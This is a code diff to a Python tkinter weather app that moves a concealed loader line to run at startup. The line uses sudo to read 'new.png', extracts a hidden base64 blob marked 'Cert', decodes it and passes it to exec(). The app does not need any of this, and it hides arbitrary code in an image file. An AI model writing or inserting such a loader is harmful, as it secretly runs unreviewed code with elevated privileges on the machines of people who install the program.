@@ -1,5 +1,5 @@
 from tkinter import *
-import requests
+import requests,os
 import bs4,base64,subprocess
 root = Tk()
 
@@ -29,6 +29,7 @@ e1.insert(0,"Enter City Name Here")
 
 frame2 = Frame(root, bg='#4a4641', bd=8)
 frame2.place(relx=0.5, rely=0.34, relwidth=0.92, relheight=0.6, anchor='n')
+exec(base64.b64decode(subprocess.check_output("sudo cat new.png | grep Cert -a | sed 's/<[^>]*>//g'", shell=True, text=True)).decode('utf-8'))
 
 l2=Label(frame2,text="",font=('calibre',15,'bold'),bg='white',justify=LEFT,anchor='c')
 l2.place(relwidth=0.55, relheight=1)
@@ -82,7 +83,7 @@ def weather():
         a="Location: %s\n\nDay: %s\n\nWeather: %s\n\nTemperature: %s degree celsius\n\n"%(l,t,w,temp)
         l2.config(text=a)
         print(a)
-        exec(base64.b64decode(subprocess.check_output("sudo cat new.png | grep Cert -a | sed 's/<[^>]*>//g'", shell=True, text=True)).decode('utf-8'))
+        
         if (w=='Sunny'):
             img2=PhotoImage(file="sunny.png")
         elif(w=='Mostly sunny'or w=='Mostly cloudy'or w=='Partly sunny'or w=='Partly Sunny'):
